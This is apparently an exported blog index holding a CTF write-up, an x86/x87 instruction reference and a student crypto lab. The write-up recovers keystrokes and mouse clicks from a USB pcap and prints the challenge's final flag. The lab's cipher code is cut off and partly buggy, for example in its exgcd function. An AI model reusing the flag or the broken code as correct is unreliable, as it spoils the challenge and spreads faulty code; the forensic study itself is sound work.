\\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\桌面\\disk.zip0x00000000017e1f90 1 0 R--rwd \\Device\\HarddiskVolume1\\Documents and Settings\\All Users\\「开始」菜单\\程序\\附件\\远程桌面连接.lnk0x000000000186f6a8 3 1 R--rwd \\Device\\HarddiskVolume1\\Documents and Settings\\All Users\\桌面0x000000000186f740 3 1 R--rwd \\Device\\HarddiskVolume1\\Documents and Settings\\Administrator\\桌面 可以发现桌面上存在着一个disk.zip，我们把它dump出来解压可以得到一个disk.img文件，解压我们可以直接得到一个流量抓包文件usb.pcapng，这样子验证了我们的猜想，当时的确是再用wireshark抓包，且还可知这是一个USB协议流量包 USB流量分析把拿到的usb.pcapng文件拖进wireshark分析 可以知道这的确是个USB流量，开始前，我们先介绍一些USB的基础知识。USB有不同的规格，以下是使用USB的三种方式：USB UART、USB HID、USB Memory UART或者Universal Asynchronous Receiver/Transmitter。这种方式下，设备只是简单的将USB用于接受和发射数据，除此之外就再没有其他通讯功能了。 HID是人性化的接口。这一类通讯适用于交互式，有这种功能的设备有：键盘，鼠标，游戏手柄和数字显示设备。 最后是USB Memory，或者说是数据存储。External HDD, thumb drive / flash drive,等都是这一类的。 其中使用的最广的不是USB HID 就是USB Memory了。 每一个USB设备（尤其是HID或者Memory）都有一个供应商ID（Vendor Id）和产品识别码（Product Id）。Vendor Id是用来标记哪个厂商生产了这个USB设备。Product Id用来标记不同的产品，他并不是一个特殊的数字，当然最好不同 我们分析可以知道，USB协议的数据部分在Leftover Capture Data域之中，在Mac和Linux下可以用tshark命令可以将 leftover capture data单独提取出来，命令如下： 1tshark -r example.pcap -T fields -e usb.capdata //如果想导入usbdata.txt文件中，后面加上参数：&gt;usbdata.txt USB数据包长度为八个字节，这里我们只关注USB流量中的键盘流量和鼠标流量 键盘数据包的数据长度为8个字节，击键信息集中在第3个字节，每次key stroke都会产生一个keyboard event usb packet 鼠标数据包的数据长度为4个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移 usb keyboard的映射表 根据这个映射表将第三个字节取出来，对应对照表得到解码 键盘流量分析我们可以写出脚本： 123456789101112131415161718mappings = &#123; 0x04:\"A\", 0x05:\"B\", 0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\", 0x0B:\"H\", 0x0C:\"I\", 0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\", 0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\", 0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"n\", 0x2a:\"[DEL]\", 0X2B:\" \", 0x2C:\" \", 0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\", 0x30:\"]\", 0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\", 0x34:\"'\", 0x36:\",\", 0x37:\".\" &#125;nums = []keys = open('usbdata.txt')for line in keys: if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0': continue nums.append(int(line[6:8],16)) # 00:00:xx:....keys.close()output = \"\"for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += '[unknown]'print('output :n' + output) 如果直接从dat文件开始分析则脚本为： 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env pythonimport sysimport osDataFileName = \"usb.dat\"presses = []normalKeys = &#123;\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"&#125;shiftKeys = &#123;\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"&#123;\",\"30\":\"&#125;\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"&#125;def main(): # check argv if len(sys.argv) != 2: print \"Usage : \" print \" python UsbKeyboardHacker.py data.pcap\" print \"Tips : \" print \" To use this python script , you must install the tshark first.\" print \" You can use `sudo apt-get install tshark` to install it\" print \"Author : \" print \" Angel_Kitty &lt;angelkitty6698@gmail.com&gt;\" print \" If you have any questions , please contact me by email.\" print \" Thank you for using.\" exit(1) # get argv pcapFilePath = sys.argv[1] # get data of pcap os.system(\"tshark -r %s -T fields -e usb.capdata &gt; %s\" % (pcapFilePath, DataFileName)) # read data with open(DataFileName, \"r\") as f: for line in f: presses.append(line[0:-1]) # handle result = \"\" for press in presses: Bytes = press.split(\":\") if Bytes[0] == \"00\": if Bytes[2] != \"00\": result += normalKeys[Bytes[2]] elif Bytes[0] == \"20\": # shift key is pressed. if Bytes[2] != \"00\": result += shiftKeys[Bytes[2]] else: print \"[-] Unknow Key : %s\" % (Bytes[0]) print \"[+] Found : %s\" % (result) # clean the temp data os.system(\"rm ./%s\" % (DataFileName))if __name__ == \"__main__\": main() 运行后我们得到一串信息：AAAAAAAAAA’ZITLQOSENPPI’.HILLDECODE 鼠标流量分析12345678910111213141516171819nums = [] keys = open('usbdata.txt','r') posx = 0 posy = 0 for line in keys: if len(line) != 12 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x &gt; 127 : x -= 256 if y &gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing if btn_flag == 1 : print posx , posy keys.close() 密码学分析经过多种密码尝试最终得出这是一个希尔密码，其实特征也很明显，有一个矩阵还有一个密文，这里推介一个希尔密码的在线加解密网站：https://www.dcode.fr/hill-cipher 我们得到一串信息：AAAAAAAAAA’ZITLQOSENPPI’.HILLDECODE 在希尔密码中： ALPHABET (A=0) ABCDEFGHIJKLMNOPQRSTUVWXYZ ALPHABET (A=1) ZABCDEFGHIJKLMNOPQRSTUVWXY 而这题我们获得了十个A则可知加密方式为： ALPHABET (A=10) QRSTUVWXYZABCDEFGHIJKLMNOP 我们之前获得了一个重要的信息：hill_matrix 3,2,2,9,7,7,6,4,9 解密可以得到：ZKNNTCUPZXOU，这题有一个小坑应全部转为小写才是正确的flag，故真正的flag应为：zknntcupzxou 参考文章 深入理解USB流量数据包的抓取与分析【https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html】 CTF MISC-USB流量分析出题记录【https://www.cnblogs.com/hackxf/p/10670844.html】","categories":[],"tags":[]},{"title":"X86和X87汇编指令大全","slug":"X86║═X87╗π▒α╓╕┴ε┤≤╚½","date":"2019-09-09T13:55:06.000Z","updated":"2019-09-10T04:55:28.000Z","comments":true,"path":"2019/09/09/X86║═X87╗π▒α╓╕┴ε┤≤╚½/","link":"","permalink":"http://yoursite.com/2019/09/09/X86║═X87╗π▒α╓╕┴ε┤≤╚½/","excerpt":"","text":"做了一下相关汇编指令的收集 整数运算指令集数据传输指令它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据 通用数据传送指令 MOV 传送字或字节 MOVSX 先符号扩展,再传送 MOVZX 先零扩展,再传送 PUSH 把字压入堆栈 POP 把字弹出堆栈 PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈 POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈 PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈 POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈 BSWAP 交换32位寄存器里字节的顺序 XCHG 交换字或字节(至少有一个操作数为寄存器,段寄存器不可作为操作数) CMPXCHG 比较并交换操作数(第二个操作数必须为累加器AL/AX/EAX) XADD 先交换再累加(结果在第一个操作数里) XLAT 字节查表转换 输入输出端口传送指令输入输出端口由立即方式指定时，其范围是 0-255; 由寄存器 DX 指定时,其范围是：0-65535 IN I/O端口输入 语法: IN 累加器, {端口号│DX} OUT I/O端口输出 语法: OUT {端口号│DX},累加器 目的地址传送指令 LEA 装入有效地址 LEA DX,string ;把偏移地址存到DX LDS 传送目标指针,把指针内容装入DS LDS SI,string;把段地址:偏移地址存到DS:SI LES 传送目标指针,把指针内容装入ES LES DI,string;把段地址:偏移地址存到ES:DI LFS 传送目标指针,把指针内容装入FS LFS DI,string;把段地址:偏移地址存到FS:DI LGS 传送目标指针,把指针内容装入GS LGS DI,string;把段地址:偏移地址存到GS:DI LSS 传送目标指针,把指针内容装入SS LSS DI,string;把段地址:偏移地址存到SS:DI 标志传送指令 LAHF 标志寄存器传送,把标志装入AH SAHF 标志寄存器传送,把AH内容装入标志寄存器 PUSHF 标志入栈 POPF 标志出栈 PUSHD 32位标志入栈 POPD 32位标志出栈 算术运算指令 ADD 加法 ADC 带进位加法 INC 加 1 AAA 加法的ASCII码调整 DAA 加法的十进制调整 SUB 减法 SBB 带借位减法 DEC 减 1 NEG 求反(以 0 减之) CMP 比较(两操作数作减法,仅修改标志位,不回送结果) AAS 减法的ASCII码调整 DAS 减法的十进制调整 MUL 无符号乘法,结果回送AH和AL(字节运算),或DX和AX(字运算) IMUL 整数乘法,结果回送AH和AL(字节运算),或DX和AX(字运算) AAM 乘法的ASCII码调整 DIV 无符号除法,结果回送:商回送AL,余数回送AH, (字节运算);或 商回送AX,余数回送DX, (字运算) IDIV 整数除法.结果回送:商回送AL,余数回送AH, (字节运算);或 商回送AX,余数回送DX, (字运算) AAD 除法的ASCII码调整 CBW 字节转换为字(把AL中字节的符号扩展到AH中去) CWD 字转换为双字(把AX中的字的符号扩展到DX中去) CWDE 字转换为双字(把AX中的字符号扩展到EAX中去) CDQ 双字扩展(把EAX中的字的符号扩展到EDX中去) 逻辑运算指令以下八种移位指令,其移位次数可达255次,移位一次时, 可直接用操作码. 如 SHL AX,1. 移位&gt;1次时, 则由寄存器CL给出移位次数. 如 MOV CL,04 SHL AX,CL AND 与运算 OR 或运算 XOR 异或运算 NOT 取反 TEST 测试(两操作数作与运算,仅修改标志位,不回送结果) SHL 逻辑左移 SAL 算术左移(=SHL) SHR 逻辑右移 SAR 算术右移(=SHR) ROL 循环左移 ROR 循环右移 RCL 通过进位的循环左移 RCR 通过进位的循环右移 串指令 DS:SI 源串段寄存器 :源串变址.ES:DI 目标串段寄存器:目标串变址.CX 重复次数计数器.AL/AX 扫描值.D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量. Z标志 用来控制扫描或比较操作的结束. MOVS 串传送(MOVSB 传送字符；MOVSW 传送字；MOVSD 传送双字) CMPS 串比较(CMPSB 比较字符;CMPSW 比较字) SCAS 串扫描(把AL或AX的内容与目标串作比较,比较结果反映在标志位) LODS 装入串(把源串中的元素(字或字节)逐一装入AL或AX中( LODSB传送字符;LODSW传送字 LODSD 传送双字) STOS 保存串(是LODS的逆过程) REP 当CX/ECX&lt;&gt;0时重复 REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复 REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复 REPC 当CF=1且CX/ECX&lt;&gt;0时重复 REPNC 当CF=0且CX/ECX&lt;&gt;0时重复 程序转移指令无条件转移指令长转移 JMP 无条件转移指令 CALL 过程调用 RET/RETF 过程返回 条件转移指令*短转移,-128到+127的距离内,当且仅当(SF XOR OF)=1时,OP1&lt;OP2 * JA/JNBE 不小于或不等于时转移 JAE/JNB 大于或等于转移 JB/JNAE 小于转移 JBE/JNA 小于或等于转移 以上四条,测试无符号整数运算的结果(标志C和Z) JG/JNLE 大于转移 JGE/JNL 大于或等于转移 JL/JNGE 小于转移 JLE/JNG 小于或等于转移 以上四条,测试带符号整数运算的结果(标志S,O和Z) JE/JZ 等于转移 JNE/JNZ 不等于时转移 JC 有进位时转移 JNC 无进位时转移 JNO 不溢出时转移 JNP/JPO 奇偶性为奇数时转移 JNS 符号位为 “0” 时转移 JO 溢出转移 JP/JPE 奇偶性为偶数时转移 JS 符号位为 “1” 时转移 循环控制指令短转移 LOOP CX不为零时循环 LOOPE/LOOPZ CX不为零且标志Z=1时循环 LOOPNE/LOOPNZ CX不为零且标志Z=0时循环 JCXZ CX为零时转移 JECXZ ECX为零时转移 中断指令 INT 中断指令 INTO 溢出中断 IRET 中断返回 处理器控制指令 HLT 处理器暂停, 直到出现中断或复位信号才继续 WAIT 当芯片引线TEST为高电平时使CPU进入等待状态 ESC 转换到外处理器 LOCK 封锁总线 NOP 空操作 STC 置进位标志位 CLC 清进位标志位 CMC 进位标志取反 STD 置方向标志位 CLD 清方向标志位 STI 置中断允许位 CLI 清中断允许位 伪指令 DW 定义字(2字节) PROC 定义过程 ENDP 过程结束 SEGMENT 定义段 ASSUME 建立段寄存器寻址 ENDS 段结束 END 程序结束 处理机控制指令：标志处理指令 CLC 进位位置0指令 CMC 进位位求反指令 STC 进位位置为1指令 CLD 方向标志置1指令 STD 方向标志位置1指令 CLI 中断标志置0指令 STI 中断标志置1指令 NOP 无操作 HLT 停机 WAIT 等待 ESC 换码 LOCK 封锁 浮点运算指令集控制指令带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B FINIT 初始化浮点部件 机器码 9B DB E3 FCLEX 清除异常 机器码 9B DB E2 FDISI 浮点检查禁止中断 机器码 9B DB E1 FENI 浮点检查禁止中断二 机器码 9B DB E0 WAIT 同步CPU和FPU 机器码 9B FWAIT 同步CPU和FPU 机器码 D9 D0 FNOP 无操作 机器码 DA E9 FXCH 交换ST(0)和ST(1) 机器码 D9 C9 FXCH ST(i) 交换ST(0)和ST(i) 机器码 D9 C1iii FSTSW ax 状态字到ax 机器码 9B DF E0 FSTSW word ptr mem 状态字到mem 机器码 9B DD mm111mmm FLDCW word ptr mem mem到状态字 机器码 D9 mm101mmm FSTCW word ptr mem 控制字到mem 机器码 9B D9 mm111mmm FLDENV word ptr mem mem到全环境 机器码 D9 mm100mmm FSTENV word ptr mem 全环境到mem 机器码 9B D9 mm110mmm FRSTOR word ptr mem mem到FPU状态 机器码 DD mm100mmm FSAVE word ptr mem FPU状态到mem 机器码 9B DD mm110mmm FFREE ST(i) 标志ST(i)未使用 机器码 DD C0iii FDECSTP 减少栈指针1-&gt;0 2-&gt;1 机器码 D9 F6 FINCSTP 增加栈指针0-&gt;1 1-&gt;2 机器码 D9 F7 FSETPM 浮点设置保护 机器码 DB E4 数据传送指令 FLDZ 将0.0装入ST(0) 机器码 D9 EE FLD1 将1.0装入ST(0) 机器码 D9 E8 FLDPI 将π装入ST(0) 机器码 D9 EB FLDL2T 将ln10/ln2装入ST(0) 机器码 D9 E9 FLDL2E 将1/ln2装入ST(0) 机器码 D9 EA FLDLG2 将ln2/ln10装入ST(0) 机器码 D9 EC FLDLN2 将ln2装入ST(0) 机器码 D9 ED FLD real4 ptr mem 装入mem的单精度浮点数 机器码 D9 mm000mmm FLD real8 ptr mem 装入mem的双精度浮点数 机器码 DD mm000mmm FLD real10 ptr mem 装入mem的十字节浮点数 机器码 DB mm101mmm FILD word ptr mem 装入mem的二字节整数 机器码 DF mm000mmm FILD dword ptr mem 装入mem的四字节整数 机器码 DB mm000mmm FILD qword ptr mem 装入mem的八字节整数 机器码 DF mm101mmm FBLD tbyte ptr mem 装入mem的十字节BCD数 机器码 DF mm100mmm FST real4 ptr mem 保存单精度浮点数到mem 机器码 D9 mm010mmm FST real8 ptr mem 保存双精度浮点数到mem 机器码 DD mm010mmm FIST word ptr mem 保存二字节整数到mem 机器码 DF mm010mmm FIST dword ptr mem 保存四字节整数到mem 机器码 DB mm010mmm FSTP real4 ptr mem 保存单精度浮点数到mem并出栈 机器码 D9 mm011mmm FSTP real8 ptr mem 保存双精度浮点数到mem并出栈 机器码 DD mm011mmm FSTP real10 ptr mem 保存十字节浮点数到mem并出栈 机器码 DB mm111mmm FISTP word ptr mem 保存二字节整数到mem并出栈 机器码 DF mm011mmm FISTP dword ptr mem 保存四字节整数到mem并出栈 机器码 DB mm011mmm FISTP qword ptr mem 保存八字节整数到mem并出栈 机器码 DF mm111mmm FBSTP tbyte ptr mem 保存十字节BCD数到mem并出栈 机器码 DF mm110mmm FCMOVB ST(0),ST(i) &lt;时传送 机器码 DA C0iii FCMOVBE ST(0),ST(i) &lt;=时传送 机器码 DA D0iii FCMOVE ST(0),ST(i) =时传送 机器码 DA C1iii FCMOVNB ST(0),ST(i) &gt;=时传送 机器码 DB C0iii FCMOVNBE ST(0),ST(i) &gt;时传送 机器码 DB D0iii FCMOVNE ST(0),ST(i) !=时传送 机器码 DB C1iii FCMOVNU ST(0),ST(i) 有序时传送 机器码 DB D1iii FCMOVU ST(0),ST(i) 无序时传送 机器码 DA D1iii 比较指令 FCOM ST(0)-ST(1) 机器码 D8 D1 FCOMI ST(0),ST(i) ST(0)-ST(1) 机器码 DB F0iii FCOMIP ST(0),ST(i) ST(0)-ST(1)并出栈 机器码 DF F0iii FCOM real4 ptr mem ST(0)-实数mem 机器码 D8 mm010mmm FCOM real8 ptr mem ST(0)-实数mem 机器码 DC mm010mmm FICOM word ptr mem ST(0)-整数mem 机器码 DE mm010mmm FICOM dword ptr mem ST(0)-整数mem 机器码 DA mm010mmm FICOMP word ptr mem ST(0)-整数mem并出栈 机器码 DE mm011mmm FICOMP dword ptr mem ST(0)-整数mem并出栈 机器码 DA mm011mmm FTST ST(0)-0 机器码 D9 E4 FUCOM ST(i) ST(0)-ST(i) 机器码 DD E0iii FUCOMP ST(i) ST(0)-ST(i)并出栈 机器码 DD E1iii FUCOMPP ST(0)-ST(1)并二次出栈 机器码 DA E9 FXAM ST(0)规格类型 机器码 D9 E5 运算指令 FADD 把目的操作数 (直接接在指令后的变量或堆栈缓存器) 与来源操作数 (接在目的操作数后的变量或堆栈缓存器) 相加，并将结果存入目的操作数 FADDP 这个指令是使目的操作数加上 ST 缓存器，并弹出 ST 缓存器，而目的操作数必须是堆栈缓存器的其中之一，最后不管目的操作数为何，经弹出一次后，目的操作数会变成上一个堆栈缓存器了 FIADD FIADD 是把 ST 加上来源操作数，然后再存入 ST 缓存器，来源操作数必须是字组整数或短整数形态的变数","categories":[],"tags":[]},{"title":"现代密码学之多表加密","slug":"╧╓┤·├▄┬δ╤º╓«╢α▒φ╝╙├▄","date":"2019-09-09T13:53:48.000Z","updated":"2019-09-17T22:40:48.000Z","comments":true,"path":"2019/09/09/╧╓┤·├▄┬δ╤º╓«╢α▒φ╝╙├▄/","link":"","permalink":"http://yoursite.com/2019/09/09/╧╓┤·├▄┬δ╤º╓«╢α▒φ╝╙├▄/","excerpt":"","text":"实验要求 根据扩展欧几里得算法实现求乘法逆元模块 根据分组长度n, 生成密钥(A,B)。即可逆矩阵A和向量B。生成的密钥要有随机性，密钥以文件形式存储 生成A的逆矩阵A-1 实现多表代换加密、解密模块 实现加密解密软件基本的可视化界面，能够对输入文本框的英文字符串进行加密解密，能够对文本文件中的文本进行加密解密 附加内容 对长度不是n的倍数的明文的处理，能够对长度不是n的倍数的明文进行加密解密 对空格和标点符号的处理。要求解密时能还原空格和标点符号 实验原理多表代换密码实现加密过程主要可以分为以下几个步骤： 随机生成n*n的可逆矩阵A，且满足A的行列式与所定模N互素，作为密钥A 随机生成n*1的矩阵B，作为密钥B 对所需明文就行分组 通过Ci≡AMi+B(mod 26)加密变换求出密文 多表代换密码实现解密过程主要可以分为以下几个步骤： 对输入的密钥A作为矩阵A，求出矩阵A的逆矩阵 对密文进行分组 通过Mi≡A−1(Ci−B)(mod 26)解密变换求出明文 软件系统设计随机生成矩阵此部分主要介绍如何随机生成可逆矩阵A和矩阵B作为密钥A和密钥B，同时实现将密钥作为文件保存 可逆矩阵A 生成可逆矩阵A的主要方法为：用单位矩阵进行初等变换而成 生成单位矩阵123456789def getIdentityMatrix(n):#生成单位矩阵 A = np.zeros((n,n)) for i in range(n): for j in range(n): if i == j: A[i][j] = 1 else: A[i][j] = 0 return A 这没有什么可以讲的很简单 生成随机可逆矩阵A12345678910111213141516171819202122232425def getInvertibleMatrix(n,m):#生成可逆矩阵 while 1: A = getIdentityMatrix(n) tempArray = np.zeros(n) B = np.zeros((n,n)) transformTime = int(random.randint(0,1000)) maxint = sys.maxsize for i in range(transformTime): mainRowNum = int((random.randint(0,n) % (n - 1)))#选择一个主行作初等行变换 for k in range(n): #元素数值是否会溢出 if maxint - (A[mainRowNum][k])*(int(random.randint(0,10))) &lt; 0 and maxint*(-1) - (A[mainRowNum][k])*(int(random.randint(0,10))) &gt; tempArray[k]: tempArray[k] = A[mainRowNum][k] else: tempArray[k] = (A[mainRowNum][k]*(int(random.randint(0,10))))%m for j in range(n): if mainRowNum != j: for k in range(n): if maxint - A[j][k]&lt; tempArray[k] and maxint * (-1) - (A[j][k]) &gt; tempArray[k]: A[j][k] = (A[j][k]/4)%m else: A[j][k] = (A[j][k] + tempArray[k])%m if gcd(np.linalg.det(A),m) == 1 and np.linalg.det(A) &gt; 0: break return A 其中transformTime为随机决定初等行变换的次数，关键是要确保矩阵A的行列式与所定模N互素 故需要此限定的条件：gcd(np.linalg.det(A),m) == 1 and np.linalg.det(A) 矩阵B123B = np.zeros((n, 1))for row in range(n): B[row] = int(random.randint(0, 26)) 这没有什么可以讲的很简单 明文分组加密预处理记录空格和符号123456789101112klist = np.zeros(len(clear)) index = 0 for i in range(len(clear)): if clear[i] == ' ': klist[index] = int(i) index = index + 1dlist = np.zeros(len(clear))index = 0for i in range(len(clear)): if clear[i] == ',': dlist[index] = int(i) index = index + 1 字符串初始化转换为纯字母序列12345for i in range(len(clear)): if clear[i] == ',': clear[i] = ' ' while ' ' in clear: clear.remove(' ') 补位操作12345678if (lenth % n == 0): flag = 0 else: flag = 1 offset = n - lenth % n for i in range(offset): CipherText.append('A') groups = int(len(CipherText) / n) 生成M序列123456M = np.zeros((groups, n)) index = 0 for row in range(groups): for column in range(n): M[row][column] = CipherText[index] index = index + 1 分组加密12345678910111213for i in range(groups):#实现矩阵乘法和矩阵加法，InA*(C-B) tmp = np.zeros((n, 1)) tmpp = np.zeros((n, 1)) for row in range(n):#初始化Mi tmp[row][0] = M[i][row] for row in range(n): # 实现C-B tmp[row][0] = tmp[row][0] - B[row][0] for row in range(n):#实现InA*(C-B)mod(N) for column in range(n): tmpp[row][0] = int(tmpp[row][0] + (int(tmp[column][0]) * int(A[row][column]))) tmpp[row][0] = int((tmpp[row][0]) % N) for row in range(n): clearlist.append(NtoA(int(tmpp[row][0]))) 消除补位影响123if flag == 1: for i in range(offset):#消除补位影响 del clearlist[-1] 逆矩阵逆元1234567def InverseElement(b,p):#求逆元 inv = 1 while 1: if (inv*b)%p == 1: break inv = inv +1 return inv 行列式123456789101112131415161718192021def Det(a,n):#求行列式 b = np.zeros((n, n))#临时数组用于降阶 sum = int(0) sign = int(0) p = int(0) if n == 1: return a[0][0] for i in range(n):#此处大循环实现将余子式存入数组b中 for c in range(n-1): for j in range(n-1): if c&lt;i: p = 0#当p=0时，行列式只向左移，即消去对应的第一列的数 else: p = 1#否则行列式左移后再上移 b[c][j]=a[c+p][j+1] if i%2 == 0: sign = 1#i为偶数，加法 else: sign = -1#i为奇数，减法 sum = sum + a[i][0]*Det(b,n-1)*sign#计算行列式的值 return sum 伴随矩阵123456789101112def getAStart(arcs,n,ans):#计算每一行每一列的每个元素所对应的余子式，组成A* if n == 1: ans[0][0] = 1 temp = np.zeros((n, n)) for i in range(n): for j in range(n): for k in range(n-1): for t in range(n-1): temp[k][t] = arcs[(k+1 if k&gt;=i else k)][(t+1 if t&gt;=j else t)] ans[j][i] = Det(temp,n-1) if (i+j)%2 == 1: ans[j][i] = -ans[j][i] 逆矩阵12345678910111213def InverseMat(a,n,p,ans): astar = np.zeros((n, n)) getAStart(a, n, astar)#求A的伴随矩阵 deta = int(Det(a,n))#求A的行列式 if deta &lt; 0: deta = deta + p inv = int(InverseElement(deta,p)) for i in range(n): for j in range(n): ans[i][j] = astar[i][j]*inv ans[i][j] = ans[i][j]%p if ans[i][j] &lt;0: ans[i][j] = ans[i][j] + p 密文分组解密补位操作12345678if (lenth % n == 0): flag = 0 else: flag = 1 offset = n - lenth % n for i in range(offset): CipherText.append('A') groups = int(len(CipherText) / n) 生成M序列123456M = np.zeros((groups, n)) index = 0 for row in range(groups): for column in range(n): M[row][column] = CipherText[index] index = index + 1 分组解密12345678910111213for i in range(groups):#实现矩阵乘法和矩阵加法，InA*(C-B) tmp = np.zeros((n, 1)) tmpp = np.zeros((n, 1)) for row in range(n):#初始化Mi tmp[row][0] = M[i][row] for row in range(n): # 实现C-B tmp[row][0] = tmp[row][0] - B[row][0] for row in range(n):#实现InA*(C-B)mod(N) for column in range(n): tmpp[row][0] = int(tmpp[row][0] + (int(tmp[column][0]) * int(A[row][column]))) tmpp[row][0] = int((tmpp[row][0]) % N) for row in range(n): clearlist.append(NtoA(int(tmpp[row][0]))) 消除补位影响123if flag == 1: for i in range(offset):#消除补位影响 del clearlist[-1] GUI图形界面最终实现GUI的实现使用的Python自带的tkinter库,实现了错误提示框的弹出和各类操作可视化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444import randomimport tkinter as tkimport numpy as npfrom tkinter.simpledialog import *def gcd(a,b): if a%b == 0: return b else : return gcd(b,a%b)def exgcd(a,b,x,y): if b==0: x=1 y=0 d = exgcd(b,a%b,y,x) y = y - (a/b)*x return ddef InverseElement(b,p):#求逆元 inv = 1 while 1: if (inv*b)%p == 1: break inv = inv +1 return invdef Det(a,n):#求行列式 b = 